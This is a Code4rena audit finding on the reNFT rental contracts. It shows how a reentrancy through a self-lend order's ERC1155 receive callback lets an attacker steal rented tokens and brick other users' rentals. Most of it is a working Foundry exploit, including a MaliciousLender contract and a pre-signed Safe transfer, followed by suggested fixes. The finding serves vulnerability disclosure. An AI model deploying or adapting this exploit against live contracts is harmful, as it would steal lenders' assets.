# [H] An attacker is able to hijack any rented ERC1155 tokens and brick rentals involving ERC1155 tokens

## Summary
Severity: High
Chain: Smart contract
Component: 2024-02-renft-mitigation
Published: 2024-03-04
Source: https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/27
Type: code-finding

## Details
# Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L1


# Vulnerability details


# Impact

An attacker can hijack any rented ERC1155 tokens and therefore permanently brick rentals involving ERC1155 tokens.


# The vulnerability

For this vulnerability to be exploited, an attacker needs to create a malicious order where the lender is a malicious smart contract the attacker controls and the borrower is also himself, so it's a self-lend. This self-lend takes advantage of a reentrancy during it's termination ([`Stop::stopRent(maliciousOrder)`]) allowing an attacker to hijack the ERC1155 tokens. 

## Proof of concept scenario

1. The attacker borrows 100 APE ERC1155 tokens with ID 5, from Alice
    - When the rental is added to the `Storage` through the function [`Storage::addRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L220), the state variable mapping `rentedAssets` is updated with how much ERC1155 tokens has the borrower (in this case, the attacker) has borrowed. 
    - So calling `Storage.isRentedOut(attackerRentalSafe, APE_ERC1155, 5)` will return `100`, since that's the amount of APE ERC1155 tokens the attacker has borrowed so far.
    - Also calling `APE_ERC1155.balanceOf(attackerRentalSafe, 5)` will also return `100`, since that's the amount of APE ERC1155 tokens with ID 5 the attacker has in his rental safe

2. The attacker creates a malicious smart contract with a malicious `onERC1155Received` callback function (more on what it'll do later).

3. The attacker owns 100 APE ERC1155 (other than the ones borrowed, these are just ones he owned before borrowing), he will transfer them to the malicious smart contract he created

4. The attacker creates a malicious `PAY` rental order (`BASE` also works), sets the offerer (lender) of the order to be the malicious smart contract, sets two offer items:      

    - 1st offer item would be `1x` APE ERC1155 tokens with ID 5
    - 2nd offer item would be `99x` APE ERC1155 tokens with ID 5

5. The attacker will fulfill that malicious order using his rental safe. So at this point, the lender would be the malicious attacker-controlled smart contract and the fulfiller would be the attacker's rental safe holding the 100 APE tokens borrowed from Alice

6. The malicious rental will begin execution, the (1 + 99) APE tokens in the malicious smart contract will be transferred to the attacker's rental safe and the rental will be stored in the `Storage.sol`. At this point:
    - Calling `Storage.isRentedOut(attackerRentalSafe, APE_ERC1155, 5)` will return `200`, since that's the amount of APE ERC1155 tokens with ID 5 the attacker has borrowed so far (100 from Alice + 100 from himself)
    - Calling `APE_ERC1155.balanceOf(attackerRentalSafe, 5)` will also return `200`, since that's the amount of APE ERC1155 tokens with ID 5 the attacker has in his rental safe

7. Now, the attacker will stop the malicious rental using [`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263).

8. The rental termination process will begin execution. [`Stop::stopRent()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Stop.sol#L263) will do two main things:
    - Firstly, it will remove the malicious rental from storage using [`Storage::removeRentals()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/modules/Storage.sol#L247). After it does that, this will be the state:
        
        - Calling `Storage.isRentedOut(attackerRentalSafe, APE_ERC1155, 5)` will return `100`, since the malicious rental order was removed, so `rentedAssets[attackersRentalSafe_APE_ERC1155_ID5] -= 100` -> (200 - 100 = 100)
        - However, calling `APE_ERC1155.balanceOf(attackerRentalSafe, 5)` will return `200`, tokens are yet to be reclaimed (reclaimed meaning the tokens getting transferred back to the lender)

    - Secondly, it will begin the reclaiming process (transfer rental tokens from the renter back to the lender). It will call the internal function `Stop::_reclaimRentedItems()` and this internal function will end up calling the reclaiming function `Reclaimer::reclaimRentalOrder()` which will do the following:

        - It'll transfer the first rental token in the order back to the lender using `safeTransferFrom()`. The first rental token in the order would be `1x APE ERC1155 token with ID 5`, and the lender would be the malicious attacker-controlled smart contract.
        - Since `safeTransferFrom()` is utilized, the `onERC1155Received` callback function will be executed in the malicious smart contract (lender of malicious order).
        - In the `onERC1155Received` callback function, the malicious smart contract will instruct the gnosis safe to `transferFrom` 99x ERC1155 APE ID 5 tokens from itself to the attacker. The malicious smart contract can do this by calling `execTransaction`, feeding it with the `transferFrom` TX calldata and the pre-signed signature of that TX (created during the setting up of the malicious smart contract, check `setSignatureAndTransaction` function in PoC in the `MaliciousLender` smart contract)
        - Since it's a `transferFrom` TX to be executed, the guard will flag this and be invoked, the following code will be executed:
        ```solidity
                    } else if (selector == e1155_safe_transfer_from_selector) {
                        // Load the token ID from calldata.
                        uint256 tokenId = uint256(
                            _loadValueFromCalldata(data, e1155_safe_transfer_from_token_id_offset)
                        );

                        // Load the token amount from calldata
                        uint256 amountToRemove = uint256(
                            _loadValueFromCalldata(data, e1155_safe_transfer_from_amount_offset)
                        );

                        // Check if the amount leaving the safe is allowed.
                ---->   _revertSelectorOnValueOverflow(selector, from, to, tokenId, amountToRemove);
                    .......
        ```
        ```solidity
        
            ------> function _revertSelectorOnValueOverflow(
                        bytes4 selector,
                        address safe,
                        address token,
                        uint256 tokenId,
                        uint256 amountToRemove
                    ) private view {
                        // Get the total amount of currently rented assets.
                ----->  uint256 rentedAmount = STORE.isRentedOut(safe, token, tokenId);

                        // Token is not actively rented, so calculating whether the amount
                        // to remove is greater than the rented amount does not matter.
                        if (rentedAmount == 0) return;

                        // Amount of tokens that are currently in the safe.
                ----->  uint256 safeBalance = IERC1155(token).balanceOf(safe, tokenId);

                        // Amount that will be remaining in the safe.
                ----->  uint256 remainingBalance = safeBalance - amountToRemove;

                        // Check if the selector is allowed for the value provided.
                        if (rentedAmount > remainingBalance) {
                            revert Errors.GuardPolicy_UnauthorizedAssetAmount(
                                selector,
                                rentedAmount,
                                remainingBalance
                            );
                        }
                    }
        
        
        ```
        - The `STORE.isRentedOut(safe, token, tokenId)` call will return `100` as mentioned in point #8, therefore `rentedAmount` will be holding `100`
        - The `IERC1155(token).balanceOf(safe, tokenId);` call will return `199` because we had `200` initially but 1x APE ERC1155 was transferred prior to the `onERC1155Received` function execution, so `200 - 1 = 199`, therefore `remainingBalance` will be holding `199`
        - The `amountToRemove` function parameter will be equal to `99`, since that's what we specified in the pre-signed `transferFrom` TX calldata
        - The `remainingBalance` variable will be equal to (`199 - 99 = 100`)
        - The last If condition will be evaluted ("Is `rentedAmount = 100` > `remainingBalance = 100`"? Nope -> Continue execution flow)
        - The execution of the `onERC1155Received` function for the first rental item in the malicious rental order will end, now we will be back to `reclaimRentalOrder`'s loop.
        - `reclaimRentalOrder` will then transfer the second rental item in the malicious rental order which is `99x` APE ERC1155 ID 5 tokens, and no malicious `onERC1155Received` execution will be conducted this time. Also no guard will be invoked here, because guards aren't involved when it's a gnosis module conducting the token transfer in and out of the safe. In this case, it's the reclaiming module (using the transferrer library) actually conducting the `99x` APE ERC1155 token transfer.
        - At this point, the attacker will have 199x APE ERC1155 tokens, with only 1 APE ERC1155 token left in the rental safe, making the termination of the legitimate rental order offered by alice, an impossible mission. 
        - Tokens hijacked successfully!


Two notes:

1. This attack can be repeated endlessly to hijack all ERC1155 tokens in the rental safe. So even if the attacker has 1000 rented ERC1155 tokens but only owns 1 personal ERC1155, he can repeat the attack a 1000 times to hijack all the rented tokens and brick all rentals involving any sum of those 1000 rented tokens.
2. The malicious order can either involve 1 ERC721 token and X number of ERC1155 tokens to trigger `onERC721Receive` and execute the attack from there or it can involve 1x ERC1155 and X ERC1155 to trigger `onERC1155Receive` and execute the attack from there. The scenario and the coded PoC demonstrate the latter.



# Coded PoC

To run the PoC, you'll need to do the following:

1. You'll need to add this file to the `test/` folder:  
    i. `Exploit.sol` -> File containing the PoC

2. You'll need to run this command:

    `forge test --mt test_Hijack_Reentrancy -vv`


**The files:**

<details>
<summary><b>Exploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        OfferItem,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {OfferItemLib} from "@seaport-sol/SeaportSol.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';

    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        using OfferItemLib for OfferItem;

        MaliciousLender maliciousLenderContract;

        function test_Hijack_Reentrancy() public {

            // bob    ==  attacker (borrower), also the owner of the malicious lender contract.
            // alice  ==  victim (lender)


            /** ------------ Deployment of essential contracts ------------ */

            // Deploy the malicious lender contract
            vm.prank(bob.addr);
            maliciousLenderContract = new MaliciousLender(); // Bob will be the owner of the malicious lender contract

            // A test ERC1155 token
            TestERC1155Token testERC1155Token = new TestERC1155Token();

            // A test ERC721 token
            TestERC721Token testERC721Token = new TestERC721Token();


            /** ------------ Approvals & Asset whitelist ------------ */

            // Add the test ERC721/1155 to the whitelist
            vm.startPrank(deployer.addr);
            admin.toggleWhitelistAsset(address(testERC1155Token), true);
            admin.toggleWhitelistAsset(address(testERC721Token), true);
            vm.stopPrank();

            // We will give alice (lender) 100 ERC1155 tokens to lend, and approve conduit
            testERC1155Token.mint(address(alice.addr), 1, 100, "");

            // We will give the malicious lender contract (bob) 100 ERC1155 tokens for the malicious rental
            testERC1155Token.mint(address(maliciousLenderContract), 1, 100, "");

            // We will give the malicious lender contract (bob) a dummy ERC721 token for the malicious rental
            testERC721Token.safeMint(address(maliciousLenderContract), 1);

            // Approve the conduit to spend alice's tokens
            vm.prank(address(alice.addr));
            testERC1155Token.setApprovalForAll(address(conduit), true);

            // Approve the conduit to spend bob's tokens
            vm.startPrank(address(maliciousLenderContract));
            testERC1155Token.setApprovalForAll(address(conduit), true);
            testERC721Token.setApprovalForAll(address(conduit), true);
            vm.stopPrank();


            /** ------------ Setting up the legitimate rental order ------------ */

            // We'll simulate a rental order where the attacker rents 100 ERC1155 tokens from Alice
            // Lender (victim)      ==   Alice
            // Borrower (attacker)  ==   Bob

            (
                RentalOrder memory legitimateRentalOrder, 
                bytes32 legitimateRentalOrderHash, 
                OrderMetadata memory legitimateRentalMetadata
            ) = setupLegitimateRental(address(testERC1155Token));

            // assert that the rental order was stored
            assertEq(STORE.orders(legitimateRentalOrderHash), true);

            // assert that 100 ERC1155 tokens exist in the borrower's safe (in this case, it's the attacker's safe)
            assertEq(STORE.isRentedOut(address(bob.safe), address(testERC1155Token), 1), 100);

            // assert that 100 ERC1155 tokens are in the rental wallet of the fulfiller
            assertEq(testERC1155Token.balanceOf(address(bob.safe), 1), 100);



            /** ------------ Setting up the malicious rental order ------------ */

            // The malicious rental is basically a self-rent. The lender is a smart contract made by the attacker and the borrower is the attacker's reNFT rental safe

            // Impersonate the attacker (owner of the malicious lender contract).
            vm.startPrank(bob.addr);

            // Set the attacker's (bob) safe address on the malicious lender contract which the malicious lender contract will communicate with.
            maliciousLenderContract.setSafeAddr(address(bob.safe));

            // Set the address of the token which the attacker wants to hijack on the malicious lender contract.
            maliciousLenderContract.setTokenToHijackAddr(address(testERC1155Token));

            vm.stopPrank();


            // Setup the malicious rental.
            // Lender    ==   the malicious lender contract (owned by bob, the attacker)
            // Borrower  ==   the attacker's rental safe (bob)

            (
                RentalOrder memory maliciousRentalOrder, 
                bytes32 maliciousRentalOrderHash, 
                OrderMetadata memory maliciousRentalMetadata
            ) = setupMaliciousRental(address(testERC1155Token));


            // assert that the rental order was stored
            assertEq(STORE.orders(maliciousRentalOrderHash), true);

            // assert that 200 ERC1155 tokens exist in the borrower's safe (in this case, it's the attacker's safe)
            assertEq(STORE.isRentedOut(address(bob.safe), address(testERC1155Token), 1), 200);

            // assert that the ERC1155 is in the rental wallet of the fulfiller (attacker)
            assertEq(testERC1155Token.balanceOf(address(bob.safe), 1), 200);


            /** ------------ Setting up the exploit ------------ */


            // ------------------- Prepare the pre-signed `transferFrom` malicious TX which the malicious lender will execute upon `onERC1155Received` callback function execution -------------------

            // The malicious TX which the malicious lender contract will execute when `onERC721Received` callback function is executed in it.
            bytes memory hijackTX = abi.encodeWithSignature(
                "safeTransferFrom(address,address,uint256,uint256,bytes)",
                address(bob.safe),
                address(bob.addr),
                1,
                99,
                ""
            );

            // Get the signature of the malicious TX.
            bytes memory transactionSignature = SafeUtils.signTransaction(
                address(bob.safe),
                bob.privateKey,
                address(testERC1155Token),
                hijackTX
            );

            // Set the malicious TX and it's signature on the malicious lender contract so that it sends it
            vm.prank(bob.addr);
            maliciousLenderContract.setSignatureAndTransaction(transactionSignature, hijackTX);

            // speed up in time past the rental expiration
            // Attacker can just construct a PAY order and terminate the rental at any time
            vm.warp(block.timestamp + 1000000);

            // Stop the malicious rental order
            vm.prank(address(maliciousLenderContract));
            stop.stopRent(maliciousRentalOrder);



            // ------------------ Proof of exploitation ------------------

            // At this point, bob will have only 1 ERC1155 token in his rental safe and 199 ERC1155 tokens in his EOA account.
            // This exploit can be used to empty the rental safe if repeated.
            // There is a 1 ERC1155 token leftover in the rental safe because we used 1 ERC1155 and 99 ERC1155 as offer items in the malicious order
            // If we want, we can use 1 ERC721 token and 100 ERC1155 tokens in the malicious order and leave 0 ERC1155 tokens in the attacker's rental safe

            uint256 bob_TestERC1155Token_Balance = testERC1155Token.balanceOf(address(bob.addr), 1); // 199
            uint256 bobsSafe_TestERC1155Token_Balance = testERC1155Token.balanceOf(address(bob.safe), 1); // 1

            if (bob_TestERC1155Token_Balance == 199 && bobsSafe_TestERC1155Token_Balance == 1) {
                console.log("ERC1155 Tokens hijacked successfully!");
            }

        }

        function setupLegitimateRental(address test_ERC1155_Token) public returns (RentalOrder memory, bytes32, OrderMetadata memory) {

            // create a BASE order
            createOrder({
                offerer: alice,
                orderType: OrderType.BASE,
                erc721Offers: 0,
                erc1155Offers: 1,
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Remove the pre-inserted offer item (which is inserted by the tests)
            popOfferItem();

            // Set the test ERC1155 token which we created as the offer item
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(test_ERC1155_Token))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(100)
                        .withEndAmount(100)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);


            return (rentalOrder, rentalOrderHash, metadata);
            

        }


        function setupMaliciousRental(address test_ERC1155_Token) public returns (RentalOrder memory, bytes32, OrderMetadata memory) {

            // Cache bob's EOA address
            address bobsOriginalEOA_Address = bob.addr;

            // We're doing this because we're passing bob's `ProtocolAccount` struct to `createOrder()`
            // And we're doing so because we want to simulate the lender (bob) being a smart contract, not an EOA
            bob.addr = address(maliciousLenderContract);

            // create a BASE order
            createOrder({
                offerer: bob,
                orderType: OrderType.BASE,
                erc721Offers: 0,
                erc1155Offers: 2, // We'll lend ourselves 2 erc1155 tokens of the same kind & ID
                erc20Offers: 0,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // Restore the correct address of the ProtocolAccount `bob` struct.
            bob.addr = bobsOriginalEOA_Address;

            // Remove the two pre-inserted offer items (which are inserted by the tests)
            popOfferItem();
            popOfferItem();

            // Lend ourselves 1 ERC1155 token.
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(test_ERC1155_Token))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(1)
                        .withEndAmount(1)
            );

            // Lend ourselves 99 ERC1155 tokens on top of the 1 token.
            withOfferItem(
                    OfferItemLib
                        .empty()
                        .withItemType(ItemType.ERC1155)
                        .withToken(address(test_ERC1155_Token))
                        .withIdentifierOrCriteria(1)
                        .withStartAmount(99)
                        .withEndAmount(99)
            );

            // Finalize the order creation
            (
                Order memory order,
                bytes32 orderHash,
                OrderMetadata memory metadata
            ) = finalizeOrder();
            

            // Create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: order,
                orderHash: orderHash,
                metadata: metadata
            });

            // Finalize the base order fulfillment
            RentalOrder memory rentalOrder = finalizeBaseOrderFulfillment();

            // get the rental order hash
            bytes32 rentalOrderHash = create.getRentalOrderHash(rentalOrder);

            return (rentalOrder, rentalOrderHash, metadata);
            

        }

    }









    // -------------------- Test ERC721/1155 tokens --------------------

    contract TestERC721Token is ERC721,  Ownable {

        constructor() ERC721("TestNFT", "TNFT") Ownable(msg.sender) {}

        function safeMint(address to, uint256 tokenId) public onlyOwner {
            _safeMint(to, tokenId);
        }

    }

    contract TestERC1155Token is ERC1155, Ownable {
        constructor() ERC1155("") Ownable(msg.sender) {}

        function mint(address account, uint256 id, uint256 amount, bytes memory data)
            public
            onlyOwner
        {
            _mint(account, id, amount, data);
        }

        function mintBatch(address to, uint256[] memory ids, uint256[] memory amounts, bytes memory data)
            public
            onlyOwner
        {
            _mintBatch(to, ids, amounts, data);
        }
    }


    interface IERC1155 {

        function balanceOfBatch(
            address[] calldata accounts,
            uint256[] calldata ids
        ) external view returns (uint256[] memory);

        function setApprovalForAll(address operator, bool approved) external;
        function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes memory data) external;
        function balanceOf(address account, uint256 id) external returns (uint256);

    }


    // -------------------- Malicious lender contract --------------------

    contract MaliciousLender {

        address private owner; // owner of the contract
        address private safe; // The address of the attacker's safe.
        address private tokenToHijack; // The address of the ERC1155 token which the attacker wants to hijack.

        bytes maliciousSafeTransactionSignature; // Signature needed for the Safe TX.
        bytes maliciousSafeTransaction; // The transaction sent to the attacker's safe which will hijack the token

        bool private lock;

        constructor() {
            owner = msg.sender;
        }

        function setSafeAddr(address _safe) external onlyOwner {
            safe = _safe;
        }

        function setTokenToHijackAddr(address _tokenAddr) external onlyOwner {
            tokenToHijack = _tokenAddr;
        }

        function setSignatureAndTransaction(bytes memory _signature, bytes memory _transaction) external onlyOwner {
            maliciousSafeTransactionSignature = _signature;
            maliciousSafeTransaction = _transaction;
        }

        function onERC721Received(address, address, uint256, bytes memory data) public virtual returns (bytes4) {
                
            return this.onERC721Received.selector;
        }

        function onERC1155Received(address, address from, uint256 id, uint256 amount, bytes memory) public virtual returns (bytes4) {
            
        // If == address(0), we don't want to trigger `_hijackERC1155Tokens`, because it'd be a mint in this case, not an actual transfer.
        if (from != address(0)) {

                // Redirect any ERC1155 tokens transferred to this contract to the owner of it (Bob)
                IERC1155(msg.sender).safeTransferFrom(
                    address(this), 
                    owner, 
                    id, 
                    IERC1155(msg.sender).balanceOf(address(this), id), 
                    ""
                );

                // On top of the previous condition, check if the variable `lock` is set to false, if yes execute the TX and set `lock` to true
                // We are doing the `lock` variable check because we only want `_hijackERC1155Tokens` to be executed once.
                if (lock == false) {
                    _hijackERC1155Tokens();
                    lock = true;
                }

        }

            return this.onERC1155Received.selector;
        }

        function onERC1155BatchReceived(address, address, uint256[] memory, uint256[] memory, bytes memory) public virtual returns (bytes4) {
            return this.onERC1155BatchReceived.selector;
        }

        // A helper function to split the signature 
        function splitSignature(bytes memory sig) public pure returns (uint8 v, bytes32 r, bytes32 s) {
            require(sig.length == 65);

            assembly {
                // first 32 bytes, after the length prefix.
                r := mload(add(sig, 32))
                // second 32 bytes.
                s := mload(add(sig, 64))
                // final byte (first byte of the next 32 bytes).
                v := byte(0, mload(add(sig, 96)))
            }

            return (v, r, s);
        }

        // EIP-1271 support. 
        // Since this is a smart contract and not an EOA fulfilling the order, this function will be called by seaport.
        function isValidSignature(bytes32 _hash, bytes memory _signature) external returns(bytes4) {
            (uint8 v, bytes32 r, bytes32 s) = splitSignature(_signature);
            address recoveredAddr = ecrecover(_hash, v, r, s);
            if (recoveredAddr == owner) {
                return 0x1626ba7e;
            } else {
                return 0x00000000;
            }
        }


        // A function utilized by the owner (the malicious lender) to be able to approve addresses to move tokens out of this contract. 
        // that address can be the conduit, it can be himself etc
        function approveAddrToSpendToken(address _token, address _addr) external onlyOwner {
            IERC1155(_token).setApprovalForAll(_addr, true);
        }


        function _hijackERC1155Tokens() internal returns(bool) {

            SafeUtils.executeTransaction(
                address(safe),
                address(tokenToHijack),
                maliciousSafeTransaction,
                maliciousSafeTransactionSignature
            );

            return true;

        }


        modifier onlyOwner {
            require(msg.sender == owner);
            _;
        }
    }


</details>


<br>

# Remediation

Two ways I can think of fixing this, first would be to remove the rentals after the reclaiming process has finished (like how everything was pre-mitigations).

2nd way, when `stopRent()` is executed, feed the reclaimer module the output of both `Store.isRentedOut(...)` and `ERC1155.balanceOf()` and add checks inside the `reclaimRentalOrder()` to state was somehow tampered with after each transfer, if something is malicious -> revert.







## Assessed type

Access Control
